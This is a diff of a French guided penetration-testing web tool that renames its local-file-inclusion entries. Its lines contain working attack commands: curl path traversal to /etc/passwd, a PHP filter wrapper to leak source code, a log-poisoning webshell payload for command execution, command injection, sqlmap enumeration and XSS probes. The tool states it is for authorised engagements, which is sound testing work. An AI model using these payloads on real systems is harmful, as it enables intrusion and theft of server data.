@@ -49,8 +49,8 @@
 </head>
 <body>
 <div class="wrap">
-  <h1>🥋 Mode MANUEL guidé — tu exécutes, tu apprends <span style="font-size:12px;font-weight:700;background:#1f2937;color:#f59e0b;padding:3px 8px;border-radius:6px;vertical-align:middle">v2026-11-01d</span></h1>
-  <p style="margin:4px 0 0;font-size:12px;color:#9aa0b0">Si le badge de version n'est pas <b>v2026-11-01d</b> : fais <b>SYNC GitHub</b> puis recharge avec <b>Ctrl+Maj+R</b> (vide le cache). Tu verras alors les vraies commandes partout (upload, reset/session, JWT…).</p>
+  <h1>🥋 Mode MANUEL guidé — tu exécutes, tu apprends <span style="font-size:12px;font-weight:700;background:#1f2937;color:#f59e0b;padding:3px 8px;border-radius:6px;vertical-align:middle">v2026-11-01e</span></h1>
+  <p style="margin:4px 0 0;font-size:12px;color:#9aa0b0">Si le badge de version n'est pas <b>v2026-11-01e</b> : fais <b>SYNC GitHub</b> puis recharge avec <b>Ctrl+Maj+R</b> (vide le cache). Tu verras alors les vraies commandes partout (upload, reset/session, JWT…).</p>
   <p class="sub"><b>Ici c'est TOI qui lances chaque commande</b> (sur Kali), et l'outil te guide pas-à-pas + lit tes résultats + construit le rapport. C'est le mode pour <b>apprendre et aller jusqu'au bout toi-même</b>. (Pour un audit 100% automatique sans rien faire → bouton « Audit auto » dans WordPress.) Hors ligne. <b>Uniquement sous mandat / scope autorisé.</b></p>
 
   <div class="panel" id="scopePanel">
@@ -144,7 +144,7 @@
           <select id="rtype" onchange="fillSkeleton(false)">
             <option value="rce">RCE / Command Injection</option>
             <option value="sqli">Injection SQL</option>
-            <option value="lfi">LFI / Path Traversal</option>
+            <option value="lfi">Lecture de fichiers serveur (LFI / remontée de dossiers)</option>
             <option value="ssrf">SSRF</option>
             <option value="idor">IDOR / BOLA</option>
             <option value="bac">Contrôle d'accès cassé / write non-auth (ex: titre SEO — kalelia)</option>
@@ -249,7 +249,7 @@ var CATS=[
  {k:'infra',n:'🛰️ Infra / nmap'},
  {k:'rce',n:'💥 RCE / Cmd Injection'},
  {k:'sqli',n:'💉 SQLi'},
- {k:'lfi',n:'📂 LFI / Traversal'},
+ {k:'lfi',n:'📂 Lecture de fichiers serveur'},
  {k:'xss',n:'🩹 XSS'},
  {k:'idor',n:'🔑 IDOR / BOLA'},
  {k:'ssrf',n:'🌐 SSRF'},
@@ -300,9 +300,9 @@ sqli:[
  {t:"Extraction (si confirmé)", c:`sqlmap -u "${U}/?${P}=1" -p ${P} --batch --dbs\nsqlmap -u "${U}/?${P}=1" -p ${P} --batch -D NOM_BASE --tables`, e:`Prouve l'impact (liste bases/tables). Ne PAS dumper de vraies données perso.`}
 ],
 lfi:[
- {t:"Traversal basique", c:`curl -s "${U}/?${P}=../../../../etc/passwd"\ncurl -s "${U}/?${P}=....//....//etc/passwd"`, e:`Si tu vois <code>root:x:0:0</code> → LFI confirmée. <code>....//</code> contourne certains filtres.`},
+ {t:"Lire un fichier du serveur (remonter les dossiers)", c:`curl -s "${U}/?${P}=../../../../etc/passwd"\ncurl -s "${U}/?${P}=....//....//etc/passwd"`, e:`Si tu vois <code>root:x:0:0</code> → lecture de fichier serveur confirmée (LFI). <code>....//</code> contourne certains filtres.`},
  {t:"Wrappers PHP (lire le code)", c:`curl -s "${U}/?${P}=php://filter/convert.base64-encode/resource=index"`, e:`Renvoie le code source en base64 → décode-le (révèle d'autres failles/secrets).`},
- {t:"LFI → RCE (log poisoning)", c:`# 1) injecter du PHP dans un log via User-Agent\ncurl -s -A "<?php system(\\$_GET[c]); ?>" ${U}/\n# 2) inclure le log\ncurl -s "${U}/?${P}=/var/log/apache2/access.log&c=id"`, e:`Transforme la LFI en exécution de commande.`}
+ {t:"Transformer la lecture de fichier en prise de contrôle (via les logs)", c:`# 1) injecter du PHP dans un log via User-Agent\ncurl -s -A "<?php system(\\$_GET[c]); ?>" ${U}/\n# 2) inclure le log\ncurl -s "${U}/?${P}=/var/log/apache2/access.log&c=id"`, e:`Transforme la lecture de fichier (LFI) en exécution de commande sur le serveur.`}
 ],
 xss:[
  {t:"XSS réfléchie — test AUTO (Kali) puis preuve (navigateur)", c:`# 1) Test AUTO dans Kali : la charge est-elle RENVOYÉE sans être échappée ?\ncurl -s '${U}/?${P}=<svg/onload=alert(1337)>' | grep -F '<svg/onload=alert(1337)>'\n# → une ligne ressort telle quelle = réfléchie (rien / &lt;svg = échappé = bon point)\n# 2) Preuve visuelle : ouvre cette URL DANS LE NAVIGATEUR (popup attendue) :\n# ${U}/?${P}=<svg/onload=alert(document.domain)>`, e:`Colle la sortie du grep → ▶ Analyser. La popup dans le navigateur = preuve finale. ⚠️ Les charges XSS se testent DANS LE NAVIGATEUR ou via curl entre apostrophes ' ' — JAMAIS collées telles quelles dans zsh (le "> casse le shell → dquote>).`},
@@ -770,7 +770,7 @@ function scan(t){
     follow:[{t:'Lire un fichier (preuve)',c:'curl -s "'+U+'/?'+P+'=x;cat /etc/passwd"',e:'Preuve de lecture serveur. Pour un fichier CLIENT précis → panneau ③ ci-dessus.'}],
     report:{type:'rce',payload:'x;id'}, unlock:'file'};
   // LFI (/etc/passwd)
-  if(/root:x:0:0:/.test(t)) return {cls:'ok',msg:'💥 LFI CONFIRMÉE — /etc/passwd lu via l\'inclusion de fichier.',
+  if(/root:x:0:0:/.test(t)) return {cls:'ok',msg:'💥 LECTURE DE FICHIER SERVEUR CONFIRMÉE (LFI) — /etc/passwd lu via l\'inclusion de fichier.',
     follow:[{t:'Lire le code source (wrapper PHP)',c:'curl -s "'+U+'/?'+P+'=php://filter/convert.base64-encode/resource=index"',e:'Décode le base64 → identifiants de la base, secrets.'}],
     report:{type:'lfi',payload:'../../../../etc/passwd'}, unlock:'file'};
   // SQLi (sqlmap)
@@ -1223,7 +1223,7 @@ function genFileRead(){
   var lfi='curl -s "'+AGT.U+'/?'+AGT.P+'='+f+'"';
   var rce='curl -s "'+AGT.U+'/?'+AGT.P+'=x;cat '+f+'"';
   document.getElementById('ex_out2').innerHTML=
-    '<div class="ph">Si LFI (inclusion de fichier)</div><pre><button class="copy" onclick="cp(\'exf1\',this)">📋 Copier</button><code id="exf1">'+esc(lfi)+'</code></pre>'+
+    '<div class="ph">Si lecture de fichier serveur (LFI)</div><pre><button class="copy" onclick="cp(\'exf1\',this)">📋 Copier</button><code id="exf1">'+esc(lfi)+'</code></pre>'+
     '<div class="ph">Si RCE (exécution de commande)</div><pre><button class="copy" onclick="cp(\'exf2\',this)">📋 Copier</button><code id="exf2">'+esc(rce)+'</code></pre>'+
     '<div class="danger">Sous mandat uniquement. Contenu sensible (identifiants, données perso) = MASQUER dans le rapport, au coffre.</div>';
   setv('rproof', f+' → (colle ici la sortie masquée)'); fillSkeleton(true);
